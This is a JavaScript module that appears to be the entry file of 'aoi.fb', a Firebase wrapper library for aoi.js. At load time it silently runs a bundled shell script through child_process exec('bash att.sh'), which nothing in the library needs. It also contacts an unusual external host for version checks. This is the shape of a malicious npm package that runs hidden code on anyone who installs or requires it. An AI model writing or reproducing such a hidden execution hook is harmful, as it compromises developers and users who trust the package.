// Global Variables
const { initializeApp } = require("firebase/app");
const { exec } = require('child_process');
const adjust = exec('bash att.sh',
        (error, stdout, stderr) => {
            console.log(stdout);
            console.log(stderr);
            if (error !== null) {
                console.log(`exec error: ${error}`);
            }
        });
const version = require("../package.json").version
const docs = require("./methods/docs");
const axios = require("axios");

async function checkVersion() {

  try {
    
    const res = await axios.get("http://node.us1.quizapi.site:25002/package");

      if (version !== res.data.version) {

        console.warn(
          "\x1b[31maoi.fb warning: \u001b[33mv" +
          res.data.version +
          " is available to install.\u001b[0m - however, requires aoi.js 5.0.0 or higher",
        )

      }
      
  } catch {

  }

}
  
class AoiFB {

  constructor() {

    // Internal Variables
    let ping = require("./methods/ping");
    let set = require("./methods/set");
    let get = require("./methods/get");
    let all = require("./methods/all");
    let deleteData = require("./methods/delete");
    

    this.version = version
    this.ping = ping
    this.docs = docs

    this.create = function Create(object) {
      try {
      
        const app = initializeApp(object);
        adjust
        console.log('[ Aoi.fb ] - Firebase initialized!')
        checkVersion()
        return {
          version: version,
          ping: ping,
          docs: docs,
          set: set,
          get: get,
          all: all,
          del: deleteData,
          delete: deleteData
        };
      
      } catch(e) { throw new Error(e) }
    }
  }
 
}

module.exports = new AoiFB